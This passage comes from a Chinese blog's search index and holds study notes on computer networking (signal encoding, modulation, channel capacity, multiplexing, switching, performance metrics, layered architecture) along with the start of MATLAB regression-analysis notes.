用**一根额外传输线来传输时钟信号**，使发送方和接收方同步，接收方按时钟信号的节拍来逐个接收码元；\n- **但是**对于计算机网络，**宁愿利用这根传输线传输数据信号**，而不是传输时钟信号；\n\n由于不归零编码**存在同步问题**，因此计算机网络中的数据传输不采用这类编码！\n\n---\n\n**归零编码：**\n\n- **每个码元传输结束后信号都要“归零”**，所以接收方只要在信号归零后进行采样即可，不需要单独的时钟信号。\n- 实际上，归零编码相当于把时钟信号用\"归零”方式编码在了数据之内,这称为“自同步”信号。\n- 但是，归零编码中大部分的**数据带宽**，都用来传输“归零”而浪费掉了。\n\n所以归零编码虽然**自同步**，但是**编码效率低**。\n\n---\n\n**曼彻斯特编码：**\n\n- 在每个码元时间的中间时刻，信号都会发生跳变\n- 负跳变表示比特1或0 | 正跳变表示比特0或1\n- 码元中间时刻的跳变即表示时钟，又表示数据\n\n**实际比特1和比特0的表示要看现实怎么规定**\n\n> 传统以太网(10Mb/s)使用的就是曼切斯特编码\n\n---\n\n**差分曼彻斯特编码**\n\n- 在每个码元时间的中间时刻，信号都会发送跳变，但与曼彻斯特不同\n- **跳变仅表示时钟，码元开始处电平是否变换表示数据**\n- 变化表示比特1或0 | 不变化表示比特0或1\n\n**实际比特1和比特0的表示要看现实怎么规定**\n\n相比之下比曼彻斯特编码变化少，更适合较高的传输速率\n\n---\n\n## 调制\n\n- 数字信号转换为模拟信号，在模拟信道中传输。\n例如WiFi，采用补码键控CCK/直接序列扩频DSSS/正交频分复用OFDM等**调制**方式。\n- 模拟信号转换为另一种模拟信号，在模拟信道中传输。\n例如，语音数据加载到模拟的载波信号中传输。频分复用FDM技术，充分利用带宽资源。\n\n**基本调制方法：**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(15).png\" width=\"80%\" />\n\n- **调幅AM**：所调制的信号由两种不同振幅的基本波形构成。每个基本波形只能表示1比特信息量。\n- **调频FM**：所调制的信号由两种不同频率的基本波形构成。每个基本波形只能表示1比特信息量。\n- **调相PM**：所调制的信号由两种不同初相位的基本波形构成。每个基本波形只能表示1比特信息量。\n\n注：使用基本调制方法，1个码元只能包含1个比特信息\n\n---\n\n**混合调制：**\n\n为使码元能够表示更多信息，我们引入混合调制，切入点便是将振幅、频率和相位结合：\n\n- 因为频率和相位是相关的，即频率是相位随时间的变化率。所以一次只能调制频率和相位两个中的一个；\n- 然而相位和振幅不相关，可以将其结合起来一起调制，称为**正交振幅调制QAM**\n\n举例：\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(16).png\" width=\"80%\" />\n\n注：每个点代表一个码元，可将码元的极坐标角度看作相位，半径看作振幅。\n\n# 信道的极限容量\n\n- 任何实际的信道都不是理想的，在传输信号时会产生各种失真以及带来多种干扰。\n- 码元传输的速率越高，或信号传输的距离越远，或噪声干扰越大，或传输媒体质量越差，在信道的输出端的波形的失真就越严重。\n\n---\n\n**奈氏准则：在假定的理想条件下，为了避免码间串扰，码元传输速率是有上限的。**\n\n- 理想低通信道的最高码元传输速率= 2W Baud = 2W 码元/秒\n- 理想带通信道的最高码元传输速率= W Baud = W码元/秒\n    - W:信道带宽(单位为Hz)，Baud:波特,即码元/秒\n- 码元传输速率又称为波特率、调制速率、波形速率或符号速率。它与比特率有一定关系：\n    - 当1个码元只携带1比特的信息量时，则波特率(码元/秒)与比特率(比特/秒)在数值上是相等的；\n    - 当1个码元携带n比特的信息量时，则波特率转换成比特率时，数值要乘以n\n- 要提高信息传输速率(比特率)，就必须设法使每一个码元能携带更多个比特的信息量。这需要采用多元制。\n- 实际的信道所能传输的最高码元速率，要明显低于奈氏准则给出的这个上限数值。\n\n---\n\n**香农公式：带宽受限且有高斯白噪声干扰的信道的极限信息传输速率。**\n\n$$\nc=W\\times \\log_{2}{(1+\\frac{S}{N})}\n$$\n\nc：信道的极限信息传输速率(单位: b/s)\n\nW：信道带宽(单位: Hz)\n\nS：信道内所传信号的平均功率\n\nN：信道内的高斯噪声功率\n\nS/N：信噪比，使用分贝(dB) 作为度量单位，信噪比(dB) =10 x log(S/N) (dB)\n\n可见 信道带宽W 或 信噪比S/N 越大，信息的极限传输速率越高。\n\n在实际信道上能够达到的信息传输速率要比该公式的极限传输速率低不少。\n这是因为在实际信道中，信号还要受到其他一些损伤，如各种脉冲干扰、信号在传输中的衰减和失真等，这些因素在香农公式中并未考虑。\n\n---\n\n在信道带宽一定的情况下，根据奈氏准则和香农公式，要想提高信息的传输速率就必须采用**多元制**(更好的调制方法) 和 努力**提高信道中的信噪比。**\n\n> 自从香农公式发表后，各种新的信号处理和调制方法就不断出现，其目的都是为了尽可能地接近香农公式给出的传输速率极限。\n\n# 信道复用技术\n\n复用 (multiplexing) 是通信技术中的基本概念。它允许用户使用一个共享信道进行通信，降低成本，提高信道利用率。\n\n---\n\n**频分复用 FDM (Frequency Division Multiplexing)**\n\n- 将整个带宽分为多份，用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带；\n- **频分复用**的所有用户在同样的时间**占用不同的带宽资源**（请注意，这里的“带宽”是频率带宽而不是数据的发送速率）\n\n---\n\n**时分复用TDM (Time Division Multiplexing)**\n\n- **时分复用**则是将时间划分为一段段等长的**时分复用帧（TDM帧）**。每一个时分复用的用户在每一个 TDM 帧中占用**固定序号**的时隙；\n- 每一个用户所占用的时隙**周期性地出现**（其周期就是TDM帧的长度）\n- TDM 信号也称为**等时** (isochronous) 信号。\n- **时分复用的所有用户在不同的时间占用同样的频带宽度。**\n\n> **时分复用可能会造成线路资源的浪费：**\n> \n> \n> 使用时分复用系统传送计算机数据时，由于计算机数据的突发性质，用户对分配到的子信道的利用率一般是不高的。\n\n为此提出的改进方案是**统计时分复用 STDM (Statistic TDM)**\n\n- STDM帧**不是固定分配**时隙，而是**按需动态地**分配时隙。因此统计时分复用可以提高线路的利用率。\n\n---\n\n**波分复用 WDM(Wavelength Division Multiplexing)**\n\n- 波分复用就是光的频分复用。\n- 使用一根光纤来同时传输多个光载波信号。\n\n---\n\n**码分复用 CDM(Code Division Multiplexing)**\n\n- 常用的名词是**码分多址** CDMA (Code Division Multiple Access)。\n- 各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。\n- 这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。","tags":["计算机网络"],"categories":["计算机网络"]},{"title":"计算机网络-第一章-概述","url":"/2021/10/29/计算机网络-第一章-概述/","content":"\n- 计算机网络已由一种**通信基础设施**发展成为一种重要的**信息服务基础设施**\n- 计算机网络已经像水，电，煤气这些基础设施一样，成为我们**生活中不可或缺**的一部分\n\n<!-- more -->\n\n# 因特网概述\n\n## **网络、互连网和因特网**\n\n**网络(Network)** ：网络由若干**结点（Node）**和连接这些结点的**链路（Link）**组成。\n\n**互连网(internet)** ：多个网络通过路由器互连起来，这样就构成了一个覆盖范围更大的网络，即互连网。因此，互连网又称为 网络的网络（Network of Networks）。\n\n**因特网(Internet)** ：因特网是世界上最大的互连网络（用户数以亿计，互连的网络数以百万计）。\n\ninternet与Internet的区别：\n\n- internet(互连网)是一个**通用名词**，它泛指多个计算机网络互连而成的网络。在这些网络之间的通信协议可以是任意的。\n- Internet(因特网)则是一个**专用名词**，它指当前全球最大的、开放的、由众多网络互连而成的特定计算机网络，它采用**TCP/IP协议族**作为通信的规则，其前身是美国的ARPANET。\n\n相似之处是两者都是网络的网络。\n\n---\n\n## 因特网发展的三个阶段\n\n1969年 从单个网络ARPANET向互联网发展：\n\n- 1969年，第一个分组交换网**ARPANET**；\n- 70年代中期，研究多种网络之间的互连；\n- 1983年，**TCP/IP协议**成为ARPANET的标准协议\n（这也就是因特网的诞生时间）\n\n1985年 逐步建成三级结构的因特网：\n\n- 1985年，NSF围绕六个大型计算机中心建设**NSFNET** (主干网、地区网和校园网) ；\n- 1990年，ARPANET任务完成，正式关闭；\n- 1991年，美国政府将因特网主干网交给私人公司经营，并开始对接入因特网的单位收费；\n\n1993年 逐步形成了多层次ISP结构的因特网\n\n- 1993年，NSFNET逐渐被若干个商用因特网主干网替代；\n政府机构不再负责因特网运营，让各种**因特网服务提供者ISP**来运营；\n- 1994年，万维网WWW技术促使因特网迅猛发展；\n- 1995年，NSFNET停止运作，因特网彻底商业化。\n  \n    ---\n\n**因特网服务提供者 ISP(Internet Service Provider)**\n\nISP可以从因特网管理机构申请到成块的IP地址，同时拥有通信线路以及路由器等联网设备。任何机构和个人只需缴纳费用，就可从**ISP的得到所需要的IP地址**。\n\n- 一旦某个用户能够接入到因特网，那么他也可以成为一个ISP，所需要做的就是购买一些如调制解调器或路由器这样的设备，让其他用户可以和他相连。\n\n> 普通用户需要通过ISP才能接入因特网\n\n中国的三大ISP：中国电信，中国联通和中国移动\n\n- **基于ISP的三层结构的因特网**\n  \n    <img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(1).png\" width=\"80%\" />\n\n## 因特网的标准化工作\n\n因特网的标准化工作对因特网的发展起到了非常重要的作用。\n\n因特网在制定其标准上的一个很大的特点是**面向公众。**\n\n- 因特网所有的**RFC**(Request For Comments)技术文档都可从因特网上免费下载；\n- 任何人都可以随时用电子邮件发表对某个文档的意见或建议。\n\n**因特网协会ISOC**是一个国际性组织，它负责对因特网进行全面管理，以及在世界范围内促进其发展和使用。\n\n- 因特网体系结构委员会IAB，负责管理因特网有关协议的开发；\n- 因特网工程部IETF，负责研究中短期工程问题，主要针对协议的开发和标准化；\n- 因特网研究部IRTF，从事理论方面的研究和开发一些需要长期考虑的问题。\n\n## 因特网的组成\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(2).png\" />\n\n边缘部分：\n\n- 由所有连接在因特网上的**主机**组成（台式电脑，大型服务器，笔记本电脑，平板，智能手机等）。\n- 这部分是**用户直接使用**的，用来进行**通信**（传送数据、音频或视频）和**资源共享**。\n\n核心部分：\n\n- 由**大量网络**和连接这些网络的**路由器**组成。\n- 这部分是**为边缘部分提供服务**的（提供连通性和交换）。\n\n扩展：\n\n路由器是一种专用计算机，但我们不称它为主机，路由器是实现分组交换的关键构建，其任务是转发收到的分组，这是网络核心最重要的部分。\n\n处在互联网边缘的部分就是连接在互联网上的所有的主机。这些主机又称为**端系统 (end system)**。\n\n**端系统在功能上可能有很大的差别：**\n\n1. 小的端系统可以是一台普通个人电脑，具有上网功能的智能手机，甚至是一个很小的网络摄像头。\n2. 大的端系统则可以是一台非常昂贵的大型计算机。\n3. 端系统的拥有者可以是个人，也可以是单位（如学校、企业、政府机关等），当然也可以是某个ISP。\n\n## 端系统的通信方式\n\n**端系统之间通信的含义：**\n\n主机 A 和主机 B 进行通信 实际上是指：\n\n- 运行在主机 A 上的某个程序和运行在主机 B 上的另一个程序进行通信；\n- **即主机** **A** **的某个进程和主机** **B** **上的另一个进程进行通信。简称为“计算机之间通信”。**\n\n端系统之间的通信方式通常可划分为两大类：\n\n**客户-服务器方式(C/S方式)：**\n\n- 客户 (client) 和服务器 (server) 都是指通信中所涉及的两个**应用进程；**\n- 客户-服务器方式所描述的是进程之间服务和被服务的关系；\n- 客户是服务的请求方，服务器是服务的提供方。\n\n注：服务请求方和服务提供方都要使用网络核心部分所提供的服务。\n\n**对等连接方式(P2P方式)：**\n\n- **对等连接**(peer-to-peer)是指两个主机在通信时并不区分哪一个是服务请求方还是服务提供方；\n- 只要两个主机都运行了对等连接软件(P2P 软件)，它们就可以进行**平等的、对等连接通信**。\n- 双方都可以下载对方已经存储在硬盘中的共享文档。\n\n# 三种交换方式\n\n网络核心部分是互联网中最复杂的部分。因为网络中的核心部分要向网络边缘中的大量主机提供连通性，使边缘部分中的任何一个主机都能够向其他主机通信（即传送或接收各种形式的数据）。\n\n在网络核心部分中起特殊作用的设备是**路由器**(router)。\n\n**路由器**是实现**分组交换** (packet switching) 的关键构件，其任务是**转发**收到的分组，这是网络核心部分最重要的功能。\n\n下面介绍三种常见的数据交换方式\n\n## **电路交换(Circuit Switching)**\n\n起初数据交换较多发生在电话使用上，最早电话之间采用两两相连的方式，拓扑图上看来就是一个完全图，如此一来，电话数量很多时，电话线也就有很多很多，很不方便。\n\n为使得每一部电话能够很方便地和另一部电话进行通信，就应该使用一个**中间设备**将这些电话连接起来，这个中间设备就是**电话交换机。**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(3).png\" width=\" 50%\" />\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(4).png\" width=\" 67%\" />\n\n- 电话交换机接通电话线的方式称为电路交换；\n- 从通信资源的分配角度来看，交换（Switching）就是按照某种方式动态地分配传输线路的资源；\n- 电路交换的三个步骤：\n    1. 建立连接（分配通信资源）\n    2. 通话（一直占用通信资源）\n    3. 释放连接（归还通信资源）\n\n当使用电路交换来传送计算机数据时，其线路的传输效率往往很低，这是因为计算机数据是突发式地出现在传输线路上的。\n\n所以计算机通常采用的是**分组交换**，而不是线路交换。\n\n## **分组交换(Packet Switching)**\n\n通常我们把表示**该消息的整块数据称为**一个**报文**。\n\n在发送报文之前，先把较长的报文划分成一个个更小的**等长数据段**，在每一个数据段前面。加上一些由**必要的控制信息组成的首部**后，就构成一个分组，也可简称为“包”，相应地，首部也可称为“包头”。\n\n首部包含了**分组的目的地址，**分组从源主机到目的主机，可走不同的路径。\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(5).png\" width=\"80%\" />\n\n- 发送方：构造分组 | 发送分组\n- 路由器：缓存分组 | 转发分组，简称为“存储转发”\n  \n    在路由器中的输入和输出端口之间没有直接连线。\n    \n    路由器处理分组的过程是：\n    \n    1. 把收到的分组先**放入缓存（暂时存储）；**\n    2. **查找转发表**，找出到某个目的地址应从哪个端口转发；\n    3. 把分组送到适当的端口**转发**出去。\n- 接收方：接收分组 | 还原报文\n\n## 报文交换(**Message Switching**)\n\n报文交换中的交换结点也采用存储转发方式，但报文交换对报文的**大小没有限制**，这就要求交换结点需要较大的缓存空间。报文交换主要用于早期的电报通信网，现在较少使用，**通常被较先进的分组交换方式所取代**。\n\n## 三种交换方式的对比\n\n假设A，B，C，D是分组传输路径所要经过的4个结点交换机，纵坐标为时间\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(6).png\" width=\"80%\" />\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(7).png\" width=\"80%\" />\n\n分析：\n\n电路交换：\n\n- 通信之前首先要建立连接；\n连接建立好之后，就可以使用已建立好的连接进行数据传送；\n数据传送后，需释放连接，以归还之前建立连接所占用的通信线路资源。\n- 一旦建立连接，中间的各结点交换机就是直通形式的，比特流可以直达终点；\n\n报文交换：\n\n- 可以随时发送报文，而不需要事先建立连接；\n**整个报文**先传送到相邻结点交换机，全部存储下来后进行查表转发，转发到下一个结点交换机；\n- 整个报文需要在各结点交换机上进行存储转发，由于不限制报文大小，因此需要各结点交换机都具有较大的缓存空间；\n\n分组交换：\n\n- 可以随时发送分组，而不需要事先建立连接；\n构成原始报文的一个个分组，依次在各结点交换机上存储转发；\n各结点交换机在发送分组的同时，还缓存接收到的分组；\n- 构成原始报文的一个个分组，在各结点交换机上进行存储转发，相比报文交换，减少了转发时延，还可以避免过长的报文长时间占用链路，同时也有利于进行差错控制。\n\n# **计算机网络的定义和分类**\n\n## **定义**\n\n计算机网络的精确定义并未统一\n\n计算机网络的最简单的定义是：一些**互**相**连**接的、**自治**的计算机的**集合**。\n\n- 互连：是指计算机之间可以通过有线或无线的方式进行数据通信；\n- 自治：是指独立的计算机，拥有自己的硬件和软件，可以单独运行使用；\n- 集合：是指至少需要两台计算机；\n\n计算机网络的较好的定义是：计算机网络主要是由一些**通用的、可编程的硬件（一定包含有中央处理机CPU）互连**而成的，而这些硬件并非专门用来实现某一特定目的（例如，传送数据或视频信号）。这些可编程的硬件能够用来**传送多种不同类型的数据**，并能**支持广泛的和日益增长的应用**。\n\n- 计算机网络所连接的硬件，并不限于一般的计算机，而是包括了智能手机等智能硬件。\n- 计算机网络并非专门用来传送数据，而是能够支持很多种的应用（包括今后可能出现的各种应用）。\n\n## 分类\n\n**按交换技术分类：**\n\n- 电路交换网络\n- 报文交换网络\n- 分组交换网络\n\n**按使用者分类：**\n\n- 公用网\n- 专用网\n\n**按传输介质分类：**\n\n- 有线网络\n- 无线网络\n\n**按覆盖范围分类：**\n\n- 广域网WAN（Wide Area Network）\n\n作用范围通常为几十到几千公里，因而有时也称为远程网（long haul network）。广域网是互联网的核心部分，其任务是通过长距离（例如，跨越不同的国家）运送主机所发送的数据。\n\n- 城域网MAN\n\n作用范围一般是一个城市，可跨越几个街区甚至整个城市\n\n- 局域网LAN\n\n一般用微型计算机或工作站通过高速通信线路相连（速率通常在 10 Mbit/s 以上），但地理上范围较小（1 km 左右）\n\n- 个域网PAN\n\n就是在个人工作的地方把个人使用的电子设备用无线技术连接起来的网络。\n\n**按拓扑结构分类：**\n\n- 总线型网络\n- 星型网络\n- 环形网络\n- 网状型网络\n\n# 计算机网络的性能指标\n\n## 速率\n\n连接在计算机网络上的主机在数字信道上传送比特的速率，也称为**比特率**或数据率。\n\n常用数据率单位：bit/s, b/s, bps \n注：速率中的 1 kb/s=1000 bps，数据中的 1 kB=1024 B.\n\n## 带宽\n\n带宽在模拟信号系统中的意义：\n\n- 指信号所包含的各种不同频率成分锁占据的频率范围\n- 单位：Hz ( kHz, MHz, GHz )\n\n带宽在计算机网络中的意义：\n\n- 用来表示网络的通信线路所能传送数据的能力\n- 网络带宽表示在单位时间内从网络中的某一点到另一点所能通过的 **最高比特率**\n- 单位：b/s ( kb/s,  Mb/s, Gb/s, Tb/s)\n\n## 吞吐量\n\n吞吐量表示在单位时间内通过某个网络(或信道、接口)的**数据量**。\n\n- 吞吐量经常被用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络；\n- 吞吐量受网络的带宽或额定速率的限制。\n\n带宽1 Gb/s的以太网，代表其**额定速率**是1 Gb/s，这个数值也是该以太网的**吞吐量的绝对上限值**。\n因此，对于带宽1 Gb/s的以太网，可能实际吞吐量只有 700 Mb/s，甚至更低。\n\n注意：吞吐量还可以用每秒传送的字节数或帧数表示\n\n## **时延**\n\n时延是指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间。\n\n网络时延由几部分组成：\n\n**发送时延**\n\n- 主机或路由器发送数据帧所需要的时间，也就是从发送数据帧的第一个比特算起，到该帧的最后一个比特发送完毕所需的时间。\n- 发送时延 = 分组长度(b) / 发送速率(b/s)\n\n**传播时延**\n\n- 电磁波在信道中传播一定的距离需要花费的时间。\n- 传播时延 = 信道长度(m) / 电磁波传播速率(m/s)\n    - 电磁波传播速率：\n    自由空间：3*10^8 m/s\n    铜线：2.3*10^8 m/s\n    光纤：2.0*10^8 m/s\n\n**处理时延**\n\n- 主机或路由器在收到分组时要花费一定时间进行处理\n- 一般不方便计算\n\n**排队时延**\n\n- 分组在进过网络传输时，要经过许多路由器。但分组在进入路由器后要先在输入队列中排队等待处理。\n- 有时会把排队时延看成 **处理时延 的一部分**\n\n总时延 = 发送时延 + 传播时延 + 处理时延 （处理时延 + 排队时延）\n\n## **时延带宽积**\n\n时延带宽积 = 传播时延 * 带宽\n\n- 若发送端连续发送数据，则在所发送的第一个比特即将到达终点时，发送端就已经发送了时延带宽积个比特；\n- 链路的时延带宽积又称为**以比特为单位的链路长度**。\n\n## **往返时间**\n\n互联网上的信息不仅仅单方向传输而是双向交互的。\n\n我们有时很需要知道**双向交互一次所需的时间**，因此**往返时间RTT(Round-Trip Time)**也是一个重要的性能指标。\n\n## **利用率**\n\n利用率有**信道利用率**和**网络利用率**两种。\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(8).png)\n\n## **丢包率**\n\n丢包率即分组丢失率，是指在一定的时间范围内，传输过程中丢失的分组数量与总分组数量的比率。\n\n丢包率具体可分为接口丢包率、结点丢包率、链路丢包率、路径丢包率、网络丢包率等。\n丢包率是网络运维人员非常关心的一个网络性能指标，但对于普通用户来说往往并不关心这个指标，因为他们通常意识不到网络丢包。\n\n分组丢失主要有两种情况：\n\n- 分组在传输过程中出现误码，被结点丢弃；\n- 分组到达一台队列已满的分组交换机时被丢弃；\n在通信量较大时就可能造成网络拥塞。\n\n因此， 丢包率反映了网络的拥塞情况：\n\n- 无拥塞时路径丢包率为0\n- 轻度拥塞时路径丢包率为1%~4%\n- 严重拥塞时路径丢包率为5%~15%\n\n# 计算机网络体系结构\n\n## 常见计算机网络体系结构\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(9).png\" width=\" 50%\" />\n\n如今用的最多的是TCP/IP体系结构，现今规模最大的、覆盖全球的、基于TCP/IP的互联网并未使用OSI标准。\n\nTCP/IP体系结构相当于将OSI体系结构的**物理层**和**数据链路层**合并为了**网络接口层**，并去掉了**会话层**和**表示层**。\n\nTCP/IP在网络层使用的协议是IP协议，IP协议的意思是网际协议，因此**TCP/IP体系结构的网络层称为网际层**\n\n扩展：一般来说路由器只包含网络接口层和网际层\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(10).png\" width=\"80%\" />\n\n**网络接口层**：并没有规定具体内容，这样做的目的是可以互连全世界各种不同的网络接口，例如：有线的以太网接口，无线局域网的WIFI接口等。\n\n**网际层**：它的核心协议是IP协议。\n\n**运输层**：TCP和UDP是这层的两个重要协议。\n\n**应用层**：这层包含了大量的应用层协议，如 HTTP , DNS 等。\n\n**IP协议（网际层）**可以将不同的**网络接口（网络接口层）**进行互连，并向其上的**TCP协议和UDP协议（运输层）**提供网络互连服务\n\n- 而**TCP协议**在享受IP协议提供的网络互连服务的基础上，可向**应用层的相应协议**提供**可靠**的传输服务；\n- **UDP协议**在享受IP协议提供的网络互连服务的基础上，可向**应用层的相应协议**提供**不可靠**的传输服务。\n\n> TCP/IP体系结构中最重要的是IP协议和TCP协议，因此用TCP和IP来表示整个协议大家族。\n\n为了便于理解，教学时通常还是把网络接口层分为物理层和数据链路层来讲解，所以原理体系结构就有五层。\n\n## 分层的必要性\n\n计算机网络是个非常复杂的系统。早在最初的ARPANET设计时就提出了分层的设计理念。\n\"分层\"可将庞大而复杂的问题，转化为若干较小的局部问题，而这些较小的局部问题就比较易于研究和处理。\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(11).png\" width=\"80%\" />\n\n- 网络层提供主机之间的逻辑通信\n- 运输层使用端口号为应用层的应用进程之间提供端到端的逻辑通信\n\n## 分层通信举例\n\n假设场景为 主机浏览器与Web服务器进行通信。(N1与N2网络之间)\n\n主机和Web服务器之间基于网络的通信，实际上是主机中的**浏览器应用进程**与Web服务器中的**Web服务器应用进程**之间基于**网络的通信。**\n\n---\n\n**1、发送方发送**\n\n第一步：\n\n- **应用层**按照HTTP协议的规定构建一个**HTTP请求报文**\n- 应用层将**HTTP请求报文**交付给**运输层**处理\n\n第二步：\n\n- **运输层**给**HTTP请求报文**添加一个**TCP首部**，使之成为**TCP报文段**\n- **TCP报文段的首部格式**作用是区分应用进程以及实现可靠传输\n- **运输层**将**TCP报文段**交付给**网络层**处理\n\n第三步：\n\n- **网络层**给**TCP报文段**添加一个**IP首部**，使之成为**IP数据报**\n- **IP数据报的首部格式**作用是使**IP数据报**可以在互联网传输，也就是被路由器转发\n- **网络层**将**IP数据报**交付给**数据链路层**处理\n\n第四步：\n\n- **数据链路层**给**IP数据报**添加一个**首部**和一个**尾部**，使之成为**帧**\n- 该**首部**的作用主要是为了让**帧**能够在一段链路上或一个网络上传输，能够被相应的目的主机接收\n- 该**尾部**的作用是让目的主机检查所接收到的**帧**是否有误码\n- **数据链路层**将**帧**交付给**物理层**\n\n第五步：\n\n- **物理层**先将**帧**看做是**比特流**，这里的网络N1假设是以太网，所以**物理层**还会给该**比特流**前面添加**前导码**\n- **前导码**的作用是为了让目的主机做好接收帧的准备\n- **物理层**将装有**前导码**的**比特流**变换成相应的**信号**发送给传输媒体\n\n第六步：\n\n- **信号**通过**传输媒体**到达**路由器**\n\n---\n\n**2、路由器转发**\n\n- **物理层**将**信号**变为**比特流**，然后去掉**前导码**后，将其交付给**数据链路层**(实际上交付的是帧)；\n- **数据链路层**将**帧**的**首部**和**尾部**去掉后，将其交付给**网络层**，这实际上交付的是**IP数据报；**\n- **网络层**解析**IP数据报**的**首部**，从中提取**目的网络地址。**\n- — — — — —\n- 提取**目的网络地址**后查找**自身路由表**。确定**转发端口**， 以便进行转发；\n- **网络层**将**IP数据报**交付给**数据链路层；**\n- **数据链路层**给**IP数据报**添加一个**首部**和一个**尾部**，使之成为**帧；**\n- **数据链路层**将帧交付给**物理层；**\n- **物理层**先将**帧**看成**比特流**，这里的网络N2假设是以太网，所以**物理层**还会给该**比特流**前面添加**前导码；**\n- 物理层将装有**前导码**的**比特流**变换成相应的**信号**发送给传输媒体，信号通过传输媒体到达**Web服务器。**\n\n---\n\n**3、接收方接收**\n\n和发送方（主机）发送过程的封装正好相反\n\n在Web 服务器上\n\n- **物理层**将**信号**变换为**比特流**，然后去掉**前导码**后成为**帧**，交付给**数据链路层；**\n- **数据链路层**将**帧**的**首部**和**尾部**去掉后成为**IP数据报**，将其交付给**网络层；**\n- **网络层**将**IP数据报**的**首部**去掉后成为**TCP报文段**，将其交付给**运输层；**\n- **运输层**将**TCP报文段**的**首部**去掉后成为**HTTP请求报文**，将其交付给**应用层；**\n- **应用层**对**HTTP请求报文**进行**解析**，然后给主机发回**响应报文**\n\n---\n\n## 体系结构中的专用术语\n\n- 实体：任何可发送或接收消息的硬件或软件进程\n- 对等实体：收发双方相同层次中的实体\n- 协议：控制两个对等实体进行逻辑通信的规则的集合\n    - 协议三要素：\n        - 语法：定义所交换信息的格式\n        - 语义：定义收发双方所要完成的操作\n        - 同步(时序)：定义收发双发的时序关系\n- 服务：\n    - 在协议的控制下，两个对等实体间的逻辑通信使得本层能够向上一层提供服务；\n    - 要实现本层协议，还需要使用下面一层所提供的服务；\n    - 协议是“**水平的**”，服务是“**垂直的**\"；\n    - 实体看得见相邻下层所提供的服务，但并不知道实现该服务的具体协议。也就是说，下面的协议对上面的实体是\"**透明**”的。\n- 服务访问点：在同一系统中**相邻两层的实体交换信息的逻辑接口**，用于区分不同的服务类型\n    - 数据链路层的服务访问点为帧的\"类型\"字段；\n    - 网络层的服务访问点为IP数据报首部中的“协议字段”；\n    - 运输层的服务访问点为“端口号”。\n- 服务原语：上层使用下层所提供的服务必须通过与下层交换一些命令, 这些命令称为服务原语。\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(13).png)\n\n- 协议数据单元PDU：**对等层次**之间传送的数据包称为该层的协议数据单元；\n- 服务数据单元SDU：同一系统内，**层与层之间**交换的数据包称为服务数据单元；\n- 多个SDU可以合成为一个PDU；一个SDU也可划分为几个PDU。","tags":["计算机网络"],"categories":["计算机网络"]},{"title":"notebook","url":"/2021/08/28/statistic-analysis/","content":"\n---\n\n```matlab\nzscore();    % 标准化函数，对每一列进行，(x-均值)/标准差\ndiag();      % 取矩阵对角元素成新矩阵\ncumsum();    % 向量的累积和，矩阵中每列的累积和\nnormplot();  % 分析数据是否服从正态分布，散点越贴近斜率为1 的曲线越好\nvar();       % 求方差\n```\n\n---\n\n<!-- more -->\n\n# 统计分析\n\n## 回归分析\n\n> 回归分析是处理变量之间**相关关系**的数学方法\n\n### 多元线性回归 regress\n\n```matlab\n[b,bint,r,rint,stats] = regress(y,X,alpha)\n```\n\n**输入：**\n\n- y： 响应数据，指定为 n×1 数值向量\n- X：预测变量数据，指定为 n×p 数值矩阵。X 的行对应于各个观测值，列对应于预测变量\n- alpha：显著性水平，0 和 1 之间，默认为0.05\n\n注：X 的行数必须与 y 的行数相同。p列的含义就是变量的个数再加一(常数项)\n\n**输出：**\n\n- b：回归系数的点估计值\n- bint：回归系数的区间估计（95%置信区间）\n- r、rint：残差及其置信区间\n- stats：检验回归模型的统计量，有四个数值\n    - R^2：相关系数，越接近1，回归方程越显著\n    - F统计量：越大，回归方程越显著\n    - p值：与F统计量对应的概率，越接近0，回归方程越显著\n    - 误差方差的估计值\n\n**用法：**\n\n```matlab\nx1 = [...]';\nx2 = [...]';\ny =  [...]';\nX = [ones(size(x1),1) x1 x2 x1.*x2];\n[b,bint,r,rint,stats] = regress(y,X)\n\n% 残差分析，区间不含零点可视为异常点\nrcoplot(r,rint)\n% 预测及作图,拿单变量举例\ny2=b(1)+b(2)*x;\nplot(x,y,'k+',x,y2,'r')\n```\n\n[regress官网链接](https://ww2.mathworks.cn/help/stats/regress.html)\n\n### 多元二项式回归 rstool\n\n```matlab\nrstool(x,y,'model')\n```\n\nmodel有四种可选：linear、purequadratic、interaction、quadratic.\n\n在交互式界面中输入需要预测的自变量数值，可以得到预测结果。\n\n输出结果中rmse(剩余标准差)最小的模型最好。\n\n### 非线性回归 nlinfit\n\n```matlab\nfunction y=func(beta,x)\nx1=x(:,1);\nx2=x(:,2);\n......;\n\nx=[...]';\ny=[...]';\nbeta0=[...]';\n\n[beta,r,J]=nlinfit(x,y,'func',beta0)\n```\n\n输入 需要定义函数形式func 以及回归系数的初值beta0，可任意多元\n\n### 逐步回归 stepwise\n\n```matlab\nstepwise(x,y)\n```\n\n逐步回归主要是在选取变量的时候使用，选择加入相应的变量，观测rmse(标准剩余差)，越小越好\n\n挑出变量后还是自己确定函数形式，并用前三种方法确定系数\n\n## 聚类分析\n\n> 可简单理解为 